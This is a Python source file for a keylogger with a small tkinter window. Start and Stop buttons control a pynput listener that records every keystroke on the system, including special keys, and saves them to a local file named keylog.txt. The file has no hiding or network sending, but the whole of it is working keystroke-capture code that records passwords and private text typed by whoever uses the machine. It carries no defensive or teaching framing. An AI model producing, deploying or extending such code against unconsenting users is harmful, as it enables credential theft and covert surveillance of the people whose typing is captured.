import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
    
    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f" [{key}] "

    def save_log(self):
        with open("keylog.txt", "a") as file:
            file.write(self.log)
        self.log = ""

def start_logging():
    global keylogger
    keylogger = Keylogger()
    messagebox.showinfo("Keylogger", "Keylogger has started.")

def stop_logging():
    global keylogger
    if keylogger.listener.running:
        keylogger.listener.stop()
        keylogger.save_log()
        messagebox.showinfo("Keylogger", "Keylogger stopped. Logs saved to keylog.txt.")
    else:
        messagebox.showinfo("Keylogger", "Keylogger is not running.")

# Create and configure the main window
root = tk.Tk()
root.title("Keylogger")

# Create and place buttons
tk.Button(root, text="Start Keylogger", command=start_logging).pack(pady=5)
tk.Button(root, text="Stop Keylogger", command=stop_logging).pack(pady=5)

# Start the main event loop
root.mainloop()
